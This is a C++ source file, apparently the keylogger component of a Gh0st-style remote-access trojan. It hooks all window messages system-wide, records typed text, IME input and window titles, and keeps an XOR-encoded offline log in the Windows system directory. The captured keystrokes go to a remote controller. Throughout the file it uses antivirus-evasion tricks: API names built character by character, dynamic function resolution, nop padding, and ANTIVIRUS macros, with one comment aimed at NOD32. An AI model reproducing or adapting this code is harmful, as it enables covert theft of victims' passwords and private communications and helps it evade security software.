// KeyboardManager.cpp: implementation of the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "KeyboardManager.h"
#pragma comment(lib, "Imm32.lib")

bool g_bSignalHook = false;

TShared*	CKeyboardManager::m_pTShared = NULL;
HANDLE		CKeyboardManager::m_hMapping_File = NULL;
HINSTANCE	CKeyboardManager::g_hInstance = NULL;
DWORD		CKeyboardManager::m_dwLastMsgTime = GetTickCount();

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

typedef HANDLE (WINAPI *CreateFileAT)
(
    __in     LPCSTR lpFileName,
    __in     DWORD dwDesiredAccess,
    __in     DWORD dwShareMode,
    __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    __in     DWORD dwCreationDisposition,
    __in     DWORD dwFlagsAndAttributes,
    __in_opt HANDLE hTemplateFile
    );

typedef BOOL (WINAPI *WriteFileT)
(
    __in        HANDLE hFile,
    __in_bcount(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    __in        DWORD nNumberOfBytesToWrite,
    __out_opt   LPDWORD lpNumberOfBytesWritten,
    __inout_opt LPOVERLAPPED lpOverlapped
    );

typedef UINT (WINAPI *GetSystemDirectoryAT)
(
    __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
    __in UINT uSize
    );

HMODULE hKeyboard =NULL;
static HMODULE g_user32=NULL;

CKeyboardManager::CKeyboardManager(CClientSocket *pClient) : CManager(pClient)
{
	ANTIVIRUS
	if(hKeyboard == NULL)
		hKeyboard = LoadLibrary("IMM32.dll");
	ANTIVIRUS
	if(g_user32==NULL)
		g_user32 = LoadLibrary("user32.dll");
	
	ANTIVIRUS

	g_bSignalHook = true;

	sendStartKeyBoard();
	WaitForDialogOpen();
	sendOfflineRecord();
	
	int	dwOffset = m_pTShared->dwOffset;

	while (m_pClient->IsRunning())
	{
		if (m_pTShared->dwOffset != dwOffset)
		{
			UINT	nSize;
			if (m_pTShared->dwOffset < dwOffset)
				nSize = m_pTShared->dwOffset;
			else
				nSize = m_pTShared->dwOffset - dwOffset;
			
			sendKeyBoardData((unsigned char *)&(m_pTShared->chKeyBoard[dwOffset]), nSize);
			
			dwOffset = m_pTShared->dwOffset;
		}
		Sleep(300);
	}

	if (!m_pTShared->bIsOffline)
	{
		g_bSignalHook = false;
	}
	else
	{
		g_bSignalHook = true;
	}
}

CKeyboardManager::~CKeyboardManager()
{
//	FreeLibrary(hKeyboard);
//	FreeLibrary(g_user32);
//	hKeyboard = NULL;
//	g_user32 = NULL;

}

void CKeyboardManager::SaveToFile(char *lpBuffer)
{
	char MyKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyCreateFileA[]={'C','r','e','a','t','e','F','i','l','e','A','\0'};
    CreateFileAT pCreateFileA = (CreateFileAT)GetProcAddress(LoadLibrary(MyKernel32),MyCreateFileA);
	char MyKernel32s[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyWriteFile[]={'W','r','i','t','e','F','i','l','e','\0'};
    WriteFileT pWriteFile = (WriteFileT)GetProcAddress(LoadLibrary(MyKernel32s),MyWriteFile);
	HANDLE	hFile = pCreateFileA(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	DWORD dwSize = GetFileSize(hFile, NULL);
	
	// 离线记录，小于50M
	if (dwSize < 1024 * 1024 * 50)
		SetFilePointer(hFile, 0, 0, FILE_END);

	// 加密
	int	nLength = lstrlen(lpBuffer);

	LPBYTE	lpEncodeBuffer = new BYTE[nLength];
	for (int i = 0; i < nLength; i++)
		lpEncodeBuffer[i] = lpBuffer[i] ^ XOR_ENCODE_VALUE;
	pWriteFile(hFile, lpEncodeBuffer, nLength, &dwBytesWrite, NULL);
__asm nop;
__asm nop;
	CloseHandle(hFile);

	delete	lpEncodeBuffer;

}

void CKeyboardManager::SaveInfo(char *lpBuffer)
{
	if (lpBuffer == NULL)
		return;

	DWORD	dwBytes = strlen(lpBuffer);

	if((dwBytes < 1) || (dwBytes > SIZE_IMM_BUFFER)) return;
	
	typedef HWND(WINAPI *tGetActiveWindow)(VOID);
	tGetActiveWindow pGetActiveWindow=(tGetActiveWindow)GetProcAddress(g_user32,"GetActiveWindow");

	HWND hWnd = pGetActiveWindow();

	typedef int (WINAPI *tGetWindowText)(HWND,LPSTR,int);
	tGetWindowText pGetWindowText =(tGetWindowText)GetProcAddress(g_user32,"GetWindowTextA");

	
	if(hWnd != m_pTShared->hActWnd)
	{
		m_pTShared->hActWnd = hWnd;
		char strCapText[256];
		pGetWindowText(m_pTShared->hActWnd, strCapText, sizeof(strCapText));

		char strSaveString[1024 * 2];
		SYSTEMTIME	SysTime;
		GetLocalTime(&SysTime);
		memset(strSaveString, 0, sizeof(strSaveString));
		wsprintf
			(
			strSaveString,
			"\r\n[%02u-%02u-%d %02u:%02u:%02u] (%s)\r\n",
			SysTime.wMonth, SysTime.wDay, SysTime.wYear,
			SysTime.wHour, SysTime.wMinute, SysTime.wSecond,
			strCapText
			);
		// 让函认为是应该保存的
		SaveInfo(strSaveString);	
	}

	if (m_pTShared->bIsOffline)
	{
		SaveToFile(lpBuffer);
	}

	// reset
	if ((m_pTShared->dwOffset + dwBytes) > sizeof(m_pTShared->chKeyBoard))
	{
		memset(m_pTShared->chKeyBoard, 0, sizeof(m_pTShared->chKeyBoard));
		m_pTShared->dwOffset = 0;
	}
	lstrcat(m_pTShared->chKeyBoard, lpBuffer);
	m_pTShared->dwOffset += dwBytes;
}

LRESULT CALLBACK CKeyboardManager::GetMsgProc(int nCode, WPARAM wParam, LPARAM lParam)
{

	if(hKeyboard == NULL)
		hKeyboard = LoadLibrary("IMM32.dll");

	if(g_user32==NULL)
		g_user32 = LoadLibrary("user32.dll");


	//HIMC WINAPI ImmGetContext(IN HWND);
	typedef HIMC (WINAPI *ImmGetContextT)(HWND);
	ImmGetContextT pImmGetContext=(ImmGetContextT)GetProcAddress(hKeyboard,"ImmGetContext");
	//LONG  WINAPI ImmGetCompositionStringA(IN HIMC, IN DWORD, OUT LPVOID, IN DWORD);
	typedef LONG  (WINAPI *ImmGetCompositionStringT)(HIMC,DWORD,LPVOID,DWORD);
	__asm nop;
	__asm nop;

	ImmGetCompositionStringT pImmGetCompositionString=(ImmGetCompositionStringT)GetProcAddress(hKeyboard,"ImmGetCompositionStringA");

	//BOOL WINAPI ImmReleaseContext(IN HWND, IN HIMC);
	typedef BOOL (WINAPI *ImmReleaseContextT)(HWND,HIMC);
	__asm nop;
	__asm nop;
	__asm nop;
	ImmReleaseContextT pImmReleaseContext=(ImmReleaseContextT)GetProcAddress(hKeyboard,"ImmReleaseContext");

	MSG*	pMsg;
	char	strChar[2];
	char	KeyName[20];
	
	typedef LRESULT(WINAPI *tCallNextHookEx)(HHOOK,int,WPARAM,LPARAM);
	tCallNextHookEx pCallNextHookEx=(tCallNextHookEx)GetProcAddress(g_user32,"CallNextHookEx");

	LRESULT result = pCallNextHookEx(m_pTShared->hGetMsgHook, nCode, wParam, lParam);
	
	typedef int(WINAPI *tGetKeyNameTextA)(LONG,LPSTR,int);
	tGetKeyNameTextA pGetKeyNameTextA=(tGetKeyNameTextA)GetProcAddress(g_user32,"GetKeyNameTextA");

	pMsg = (MSG*)(lParam);
	// 防止消息重复产生记录重复，以pMsg->time判断
	if (
		(nCode != HC_ACTION) || 
		((pMsg->message != WM_IME_COMPOSITION) && (pMsg->message != WM_CHAR)) ||
		(m_dwLastMsgTime == pMsg->time)
		)
	{
		return result;
	}

	m_dwLastMsgTime = pMsg->time;
	
	if ((pMsg->message == WM_IME_COMPOSITION) && (pMsg->lParam & GCS_RESULTSTR))
	{
		HWND	hWnd = pMsg->hwnd;
		HIMC	hImc = pImmGetContext(hWnd);
		__asm nop;
		__asm nop;
		__asm nop;

		LONG	strLen = pImmGetCompositionString(hImc, GCS_RESULTSTR, NULL, 0);
		// 考虑到UNICODE
		strLen += sizeof(WCHAR);
		ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));
		strLen = pImmGetCompositionString(hImc, GCS_RESULTSTR, m_pTShared->str, strLen);
		
		pImmReleaseContext(hWnd, hImc);
		
		SaveInfo(m_pTShared->str);
	}

	if (pMsg->message == WM_CHAR)
	{
		if (pMsg->wParam <= 127 && pMsg->wParam >= 20)
		{
			strChar[0] = pMsg->wParam;
			strChar[1] = '\0';
			SaveInfo(strChar);
		}
		else if (pMsg->wParam == VK_RETURN)
		{
			SaveInfo("\r\n");
		}
		// 控制字符
		else
		{
			memset(KeyName, 0, sizeof(KeyName));
			ANTIVIRUS

			if (pGetKeyNameTextA(pMsg->lParam, &(KeyName[1]), sizeof(KeyName) - 2) > 0)
			{
				KeyName[0] = '[';
				lstrcat(KeyName, "]");
				SaveInfo(KeyName);
			}
		}
	}
	return result;
}
typedef DWORD
(WINAPI
 *GetFileAttributesAT)(
 __in LPCSTR lpFileName
    );

void CKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == COMMAND_NEXT)
		NotifyDialogIsOpen();
GetFileAttributesAT pGetFileAttributesA=(GetFileAttributesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetFileAttributesA");
	if (lpBuffer[0] == COMMAND_KEYBOARD_OFFLINE)
	{
		m_pTShared->bIsOffline = !m_pTShared->bIsOffline;
		if (!m_pTShared->bIsOffline)
			DeleteFile(m_pTShared->strRecordFile);
		
		else if (pGetFileAttributesA(m_pTShared->strRecordFile) == -1)
		{
			char MyKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
			char MyCreateFileA[]={'C','r','e','a','t','e','F','i','l','e','A','\0'};
			CreateFileAT pCreateFileA = (CreateFileAT)GetProcAddress(LoadLibrary(MyKernel32),MyCreateFileA);
			HANDLE hFile = pCreateFileA(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
				CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			CloseHandle(hFile);
		}
	}
	if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR && m_pTShared->bIsOffline)
	{
		char MyKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
		char MyCreateFileA[]={'C','r','e','a','t','e','F','i','l','e','A','\0'};
		CreateFileAT pCreateFileA = (CreateFileAT)GetProcAddress(LoadLibrary(MyKernel32),MyCreateFileA);
		HANDLE hFile = pCreateFileA(m_pTShared->strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
			CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CloseHandle(hFile);
	}
}

bool CKeyboardManager::Initialization()
{
	if(g_user32 == NULL)
		g_user32 = LoadLibrary("user32.dll");

	CShareRestrictedSD ShareRestrictedSD;
	ANTIVIRUS
	m_hMapping_File = CreateFileMapping((HANDLE)0xFFFFFFFF, ShareRestrictedSD.GetSA(), PAGE_READWRITE, 0, sizeof(TShared), "MyCreateMa");
	ANTIVIRUS
	if (m_hMapping_File == NULL)
		return false;
	// 注意m_pTShared不能进行清零操作，因为对像已经存在, 要在StartHook里进行操作
	ANTIVIRUS
	m_pTShared = (TShared *)MapViewOfFile(m_hMapping_File, FILE_MAP_WRITE | FILE_MAP_READ, 0, 0, 0);
	ANTIVIRUS
	if (m_pTShared == NULL)
		return false;

	return true;
}
typedef DWORD
(WINAPI
 *GetFileAttributesAT)(
 __in LPCSTR lpFileName
    );
bool CKeyboardManager::StartHook()
{
	char MyKernel32sss[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyGetSystemDirectoryA[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
    GetSystemDirectoryAT pGetSystemDirectoryA = (GetSystemDirectoryAT)GetProcAddress(LoadLibrary(MyKernel32sss),MyGetSystemDirectoryA);
	if (!Initialization())
		return false;

	ZeroMemory(m_pTShared, sizeof(TShared));

	g_bSignalHook = true;

	m_dwLastMsgTime = GetTickCount();
	m_pTShared->hActWnd = NULL;
	m_pTShared->hGetMsgHook = NULL;
	m_pTShared->dwOffset = 0;
	
	ZeroMemory(m_pTShared->str, sizeof(m_pTShared->str));

	pGetSystemDirectoryA(m_pTShared->strRecordFile, sizeof(m_pTShared->strRecordFile));
	__asm nop;
	__asm nop;
	lstrcat(m_pTShared->strRecordFile, "\\xhjmjj.dat");
	
	//FUCK NOD32杀这里
	typedef HHOOK(WINAPI *tSetWindowsHookExA)(int,HOOKPROC,HINSTANCE,DWORD);
	ANTIVIRUS
	tSetWindowsHookExA pSetWindowsHookExA=(tSetWindowsHookExA)GetProcAddress(g_user32,"SetWindowsHookExA");
	ANTIVIRUS
GetFileAttributesAT pGetFileAttributesA=(GetFileAttributesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetFileAttributesA");
	// 文件存在，就开始离线记录开启
	if (pGetFileAttributesA(m_pTShared->strRecordFile) != -1)
		m_pTShared->bIsOffline = true;
	else
		m_pTShared->bIsOffline = false;

	if (m_pTShared->hGetMsgHook == NULL)
	{
		m_pTShared->hGetMsgHook = pSetWindowsHookExA(WH_GETMESSAGE, GetMsgProc, g_hInstance, 0);
	}
	
	return true;
}

void CKeyboardManager::StopHook()
{
	typedef BOOL(WINAPI *tUnhookWindowsHookEx)(HHOOK);
	tUnhookWindowsHookEx pUnhookWindowsHookEx=(tUnhookWindowsHookEx)GetProcAddress(g_user32,"UnhookWindowsHookEx");
	
	if (m_pTShared->hGetMsgHook != NULL)
		pUnhookWindowsHookEx(m_pTShared->hGetMsgHook);

	m_pTShared->hGetMsgHook = NULL;

	UnmapViewOfFile(m_pTShared);
	CloseHandle(m_hMapping_File);
	m_pTShared = NULL;
}

int CKeyboardManager::sendStartKeyBoard()
{
	BYTE	bToken[2];
	bToken[0] = TOKEN_KEYBOARD_START;
	bToken[1] = (BYTE)m_pTShared->bIsOffline;

	return Send((LPBYTE)&bToken[0], sizeof(bToken));	
}

int CKeyboardManager::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
	int nRet = -1;
	DWORD	dwBytesLength = 1 + nSize;
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
	lpBuffer[0] = TOKEN_KEYBOARD_DATA;
	memcpy(lpBuffer + 1, lpData, nSize);
	
	nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
	LocalFree(lpBuffer);
	return nRet;	
}

int CKeyboardManager::sendOfflineRecord()
{
	char MyKernel32[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyCreateFileA[]={'C','r','e','a','t','e','F','i','l','e','A','\0'};
    CreateFileAT pCreateFileA = (CreateFileAT)GetProcAddress(LoadLibrary(MyKernel32),MyCreateFileA);
	char MyKernel32sss[] = {'k','e','r','n','e','l','3','2','.','d','l','l','\0'};
	char MyGetSystemDirectoryA[] = {'G','e','t','S','y','s','t','e','m','D','i','r','e','c','t','o','r','y','A','\0'};
    GetSystemDirectoryAT pGetSystemDirectoryA = (GetSystemDirectoryAT)GetProcAddress(LoadLibrary(MyKernel32sss),MyGetSystemDirectoryA);
	int		nRet = 0;
	DWORD	dwSize = 0;
	DWORD	dwBytesRead = 0;
	char	strRecordFile[MAX_PATH];
	pGetSystemDirectoryA(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, "\\xhjmjj.dat");

	HANDLE	hFile = pCreateFileA(strRecordFile, GENERIC_READ, FILE_SHARE_READ,
		NULL,OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		dwSize = GetFileSize(hFile, NULL);
		if(dwSize==0)
		{
			CloseHandle(hFile);
			return 1;
		}
		char *lpBuffer = new char[dwSize];
		ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
		// 解密
		for (int i = 0; i < dwSize; i++)
			lpBuffer[i] ^= XOR_ENCODE_VALUE;
		nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
		delete lpBuffer;
	}
	CloseHandle(hFile);
	return nRet;
}
